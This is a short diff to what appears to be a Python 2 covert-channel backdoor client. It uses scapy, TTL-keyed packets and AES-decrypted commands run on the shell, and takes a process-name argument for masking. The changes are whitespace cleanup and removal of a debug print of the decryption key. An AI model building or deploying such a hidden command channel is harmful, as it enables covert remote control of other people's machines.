@@ -24,7 +24,7 @@
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 import sys # Used for exiting the system on errors
 import logging #Dependancy for next import
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Used to supress scapy 
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Used to supress scapy
 #              warnings so that nothing is printed to screen when packets are sent
 from scapy.all import * #Scapy packet crafting library
 import os # Used for executing commands on shell.
@@ -58,7 +58,7 @@ def usage():
     global ttlKey
     global decryptionKey
     global IV
-    global dstPort 
+    global dstPort
     global processName
     if len(sys.argv) < 5:
         print "Please use format python client.py <dstPort> <ttlkey> <decryptionKey> <IV> <processName>"
@@ -98,7 +98,6 @@ def usage():
 def decryptCommand(command):
     global decryptionKey
     decryptionKey = decryptionKey
-    print "decryptionKey is " + decryptionKey
     global IV
     IV = IV
     decryptor = AES.new(decryptionKey, AES.MODE_CFB, IV=IV)
@@ -161,7 +160,7 @@ def receivedPacket(packet):
         else:
             return False
 
-#MAIN() 
+#MAIN()
 if __name__ == "__main__":
     global dstPort
     global processName
